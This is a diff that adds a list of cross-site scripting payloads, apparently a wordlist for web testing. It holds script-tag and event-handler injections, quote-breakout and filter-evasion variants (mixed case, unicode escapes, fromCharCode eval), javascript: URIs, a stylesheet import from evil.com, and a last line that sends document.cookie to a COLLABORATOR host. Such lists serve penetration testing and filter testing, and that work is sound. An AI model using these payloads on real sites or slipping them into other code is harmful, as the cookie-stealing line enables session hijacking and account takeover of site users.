@@ -1,0 +1,34 @@
+<script>alert(document.domain)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<script>\u0061lert(1)</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+javascript:alert(1)
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+<IMG SRC=x onerror="alert(1)">
+<IMG SRC=javascript:alert(1)>
+<IMG SRC=javascript:alert('XSS')>
+<IMG """><script>alert(1)</script>
+<BODY ONLOAD=alert(1)>
+<STYLE>@import url(http://evil.com/xss.css);</STYLE>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1)">
+<IFRAME SRC=javascript:alert(1)>
+<OBJECT DATA="javascript:alert(1)">
+<LINK REL="stylesheet" HREF="javascript:alert(1)">
+<SCRIPT>location.href="http://COLLABORATOR/?c="+document.cookie</SCRIPT>
